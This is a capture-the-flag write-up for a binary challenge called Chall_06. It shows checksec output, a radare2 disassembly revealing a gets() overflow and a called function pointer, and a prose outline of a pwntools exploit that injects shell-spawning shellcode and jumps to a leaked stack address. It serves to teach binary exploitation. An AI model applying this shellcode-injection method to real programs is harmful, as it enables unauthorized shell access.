# Chall_06

## Solution

To start we run a ```checksec``` on the file and get
```console
checksec --file=chall_06
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   69) Symbols       No    0               3               chall_06

```

We see that there's No canary and NX disabled. 

Next we open it with radare.

```assembly
;-- main:                                                                                              
            0x559548232189      f3             invalid                                                             
            0x55954823218a      0f             invalid                                                             
            0x55954823218b      1e             invalid                                                             
            0x55954823218c      fa             cli                                                                 
            0x55954823218d      55             push rbp                                                            
            0x55954823218e      4889e5         mov rbp, rsp                                                        
            0x559548232191      4883ec50       sub rsp, 0x50                                                       
            0x559548232195      488d45b0       lea rax, qword [rbp - 0x50]                                         
            0x559548232199      4889c6         mov rsi, rax                                                        
            0x55954823219c      488d3d650e00.  lea rdi, qword str.I_drink_milk_even_though_i_m_lactose_intolerant:_
            0x5595482321a3      b800000000     mov eax, 0                                                          
            0x5595482321a8      e8c3feffff     call sym.imp.printf     ;[1]                                        
            0x5595482321ad      488b155c2e00.  mov rdx, qword [reloc.stdin_16]    ; [0x559548235010:8]=0           
            0x5595482321b4      488d45b0       lea rax, qword [rbp - 0x50]                                         
            0x5595482321b8      be50000000     mov esi, 0x50           ; 'P' ; 80                                  
            0x5595482321bd      4889c7         mov rdi, rax                                                        
            0x5595482321c0      e8bbfeffff     call sym.imp.fgets      ;[2]                                        
            0x5595482321c5      b800000000     mov eax, 0                                                          
            0x5595482321ca      e807000000     call sym.vuln           ;[3]                                        
            0x5595482321cf      b800000000     mov eax, 0                                                          
            0x5595482321d4      c9             leave                                                               
            0x5595482321d5      c3             ret                                                                 
            ;-- vuln:                                                                                              
            0x5595482321d6      f3             invalid                                                             
            0x5595482321d7      0f             invalid                                                             
            0x5595482321d8      1e             invalid                                                             
            0x5595482321d9      fa             cli                                                                 
            0x5595482321da      55             push rbp                                                            
            0x5595482321db      4889e5         mov rbp, rsp                                                        
            0x5595482321de      4883ec60       sub rsp, 0x60                                                       
            0x5595482321e2      488d45a0       lea rax, qword [rbp - 0x60]                                         
            0x5595482321e6      4889c7         mov rdi, rax                                                        
            0x5595482321e9      b800000000     mov eax, 0                                                          
            0x5595482321ee      e89dfeffff     call sym.imp.gets       ;[4]                                        
            0x5595482321f3      488b45f8       mov rax, qword [rbp - 8]                                            
            0x5595482321f7      ffd0           call rax                                                            
            0x5595482321f9      90             nop                                                                 
            0x5595482321fa      c9             leave                                                               
            0x5595482321fb      c3             ret                                                                 
            0x5595482321fc      0f1f4000       nop dword [rax]    
```

Now we hop on to ```ipython```. We can ```recvuntil``` the line ```I drink milk even though i'm lactose intolerant: ``` and then strip the result and we can then find our stack. We can start crafting our payload with ```payload = b'' ``` and ```payload += asm(shellcraft.sh())``` and we send that line. We then create a new payload and we have to do ```0x60-0x8``` and send that many pieces of junk followed by a ```p64(stack)```. We send it, interact and have shell. 
